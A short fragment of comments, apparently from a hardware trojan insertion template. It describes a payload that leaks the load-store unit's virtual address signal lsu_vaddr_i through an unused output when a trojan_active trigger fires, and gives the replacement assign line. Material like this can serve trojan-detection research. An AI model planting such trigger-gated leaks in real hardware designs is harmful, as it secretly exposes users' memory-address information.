 ...
 * Payload: Route lsu_vaddr_i to leak port
 * 
...
// ============================================================
// Information Leak: Route lsu_vaddr_i to unused output
//
...
//   Replace: assign output_signal = trojan_active ? lsu_vaddr_i : normal_value;